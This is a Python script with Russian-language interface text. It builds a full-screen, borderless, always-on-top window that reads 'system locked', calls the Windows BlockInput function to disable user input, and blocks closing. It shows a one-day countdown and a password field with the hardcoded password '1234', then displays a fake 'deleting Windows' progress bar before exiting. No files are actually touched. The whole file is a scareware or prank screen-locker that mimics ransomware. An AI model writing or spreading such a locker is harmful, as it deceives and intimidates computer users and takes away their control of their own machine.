import tkinter as tk
import sys
import threading
import time
import ctypes
from datetime import datetime, timedelta

# ===== НАСТРОЙКИ =====
PASSWORD = "1234"
MAX_ATTEMPTS = 100
LOCK_TIME_SECONDS = 86400  # 1 день

# ===== ПЕРЕМЕННЫЕ =====
attempts = 0
stop_timer = False
unlocked = False

# ===== БЛОКИРОВКА ВВОДА =====
def block_input(block=True):
    try:
        ctypes.windll.user32.BlockInput(block)
    except:
        pass

# ===== ФУНКЦИИ =====
def check_password():
    global attempts, unlocked
    
    if unlocked:
        return
        
    attempts += 1
    remaining = MAX_ATTEMPTS - attempts
    attempts_label.config(text=f"Попыток: {attempts}/{MAX_ATTEMPTS}")
    
    if entry.get() == PASSWORD:
        unlocked = True
        stop_timer = True
        block_input(False)
        label_status.config(text="✅ ДОСТУП РАЗРЕШЁН", fg="green")
        btn.config(state="disabled")
        entry.config(state="disabled")
        root.after(2000, exit_app)
    else:
        if remaining > 0:
            label_status.config(text=f"❌ Неверно! Осталось: {remaining}", fg="red")
        else:
            label_status.config(text="💀 ПОПЫТКИ ИСЧЕРПАНЫ", fg="red")
            threading.Thread(target=fake_delete, daemon=True).start()
        entry.delete(0, tk.END)

def exit_app():
    root.destroy()
    sys.exit()

def fake_delete():
    time.sleep(1)
    for i in range(0, 101, 10):
        if unlocked:
            return
        label_status.config(text=f"⚠️ УДАЛЕНИЕ WINDOWS... {i}%", fg="orange")
        time.sleep(0.3)
    label_status.config(text="💀 WINDOWS УДАЛЕНА", fg="red")
    time.sleep(2)
    exit_app()

def update_timer():
    end_time = datetime.now() + timedelta(seconds=LOCK_TIME_SECONDS)
    while not stop_timer:
        remaining = (end_time - datetime.now()).total_seconds()
        if remaining <= 0:
            timer_label.config(text="⏰ ВРЕМЯ ВЫШЛО")
            threading.Thread(target=fake_delete, daemon=True).start()
            break
        hours = int(remaining // 3600)
        minutes = int((remaining % 3600) // 60)
        seconds = int(remaining % 60)
        timer_label.config(text=f"⏳ {hours:02d}:{minutes:02d}:{seconds:02d}")
        time.sleep(1)
    stop_timer = True

# ===== ЗАПРЕТ ЗАКРЫТИЯ =====
def disable_event():
    pass

# ===== ОКНО НА ВЕСЬ ЭКРАН =====
root = tk.Tk()
root.title("")
root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")
root.attributes('-topmost', True)
root.overrideredirect(True)  # Убираем рамку — нет крестика
root.protocol("WM_DELETE_WINDOW", disable_event)  # Блокируем закрытие
root.configure(bg='#0f0f0f')

# Блокируем ввод (кроме нашего окна)
block_input(True)

# ===== ИНТЕРФЕЙС ПО ЦЕНТРУ =====
main_frame = tk.Frame(root, bg='#1e1e1e', bd=2, relief='ridge')
main_frame.place(relx=0.5, rely=0.5, anchor='center', width=600, height=450)

tk.Label(main_frame, text="🔒 СИСТЕМА ЗАБЛОКИРОВАНА", 
         font=("Arial", 20, "bold"), bg="#1e1e1e", fg="#ff4444").pack(pady=(30, 10))

timer_label = tk.Label(main_frame, text="⏳ 23:59:59", 
                       font=("Courier New", 26, "bold"), bg="#1e1e1e", fg="orange")
timer_label.pack(pady=15)

entry = tk.Entry(main_frame, show="*", font=("Arial", 18), width=20,
                 bg="#2d2d2d", fg="white", insertbackground="white", justify="center")
entry.pack(pady=15)
entry.focus()

btn = tk.Button(main_frame, text="РАЗБЛОКИРОВАТЬ", command=check_password,
                font=("Arial", 16, "bold"), bg="#0078d7", fg="white",
                activebackground="#005a9e", bd=0, padx=30, pady=8)
btn.pack(pady=10)

label_status = tk.Label(main_frame, text="", font=("Arial", 14),
                        bg="#1e1e1e", fg="white")
label_status.pack(pady=5)

attempts_label = tk.Label(main_frame, text=f"Попыток: 0/{MAX_ATTEMPTS}",
                          font=("Arial", 12), bg="#1e1e1e", fg="#aaaaaa")
attempts_label.pack(pady=5)

# Enter
root.bind('<Return>', lambda event: check_password())

# Запуск таймера
threading.Thread(target=update_timer, daemon=True).start()

# Запуск
root.mainloop()